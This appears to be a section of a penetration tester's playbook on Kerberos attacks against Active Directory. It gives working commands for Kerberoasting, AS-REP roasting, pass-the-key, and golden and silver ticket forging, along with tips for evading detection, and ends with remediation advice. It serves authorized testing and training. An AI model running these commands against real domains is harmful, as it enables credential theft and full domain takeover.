# Stage 2 — Kerberos Attacks

## Kerberoasting
Any authenticated user can request service tickets for accounts with an SPN; the
ticket is encrypted with the service account's NT hash → crack offline. Service
accounts often have weak, non-expiring passwords.
```bash
# Linux
nxc ldap <DC> -u user -p pass --kerberoasting kerb.txt
GetUserSPNs.py corp.local/user:pass -dc-ip <DC> -request -outputfile kerb.txt
# Target specific / high-value SPNs only (quieter)
GetUserSPNs.py corp.local/user:pass -request-user svc_sql
# Crack
hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule
```
"Kerberoasting without pre-auth": if you can set an SPN on an account you control
via ACL, roast it (see acl-and-object-abuse.md). Prioritize accounts in
Domain/Enterprise Admins, or with useful ACLs (BloodHound flags "Kerberoastable").

## AS-REP Roasting
Accounts with **"Do not require Kerberos pre-authentication"** leak an AS-REP
encrypted with their hash — no creds needed if you have a username list; any
creds otherwise.
```bash
# With a user list, no creds:
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip <DC>
# Authenticated discovery:
nxc ldap <DC> -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
```

## Overpass-the-hash / pass-the-key
Turn an NT/AES key into a Kerberos TGT (see lateral-movement.md for use):
```bash
getTGT.py corp.local/user -hashes :<nthash>       # -> user.ccache
export KRB5CCNAME=user.ccache
nxc smb <host> -k --use-kcache
```

## Ticket forging (post-compromise — document as impact/persistence)
Only after you already hold the relevant key; these prove blast radius.
- **Golden ticket** — forge any TGT with the `krbtgt` hash (full domain, any user):
```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator
```
- **Silver ticket** — forge a service ticket with a service account/computer hash
  (access one service, stealthier, no DC contact):
```bash
ticketer.py -nthash <service_hash> -domain-sid <SID> -spn cifs/host corp.local user
```
- **Diamond/Sapphire** — modify a real TGT (better OPSEC than golden). Use Rubeus
  on a Windows foothold.

Note golden/silver/diamond in the report as *persistence risk demonstrating full
compromise* — don't leave forged tickets active; clean up.

## Kerberos relay / delegation interplay
Coercion + delegation + Kerberos → DC takeover; see delegation-and-coercion.md
and adcs.md (ESC8/Certifried).

## OPSEC
Kerberoast/AS-REP requests are logged (event 4769/4768 with RC4). Request only
what you need; prefer targeted roasting; expect blue-team honeypot SPNs — avoid
mass-requesting every SPN.

## Remediation to recommend
Use gMSA / long random (25+ char) passwords for service accounts; remove unused
SPNs; disable RC4 (AES-only) so roast hashes are far harder to crack; remove "do
not require pre-auth"; protect `krbtgt` and rotate it twice on compromise; alert
on RC4 TGS requests and abnormal 4769 volume.
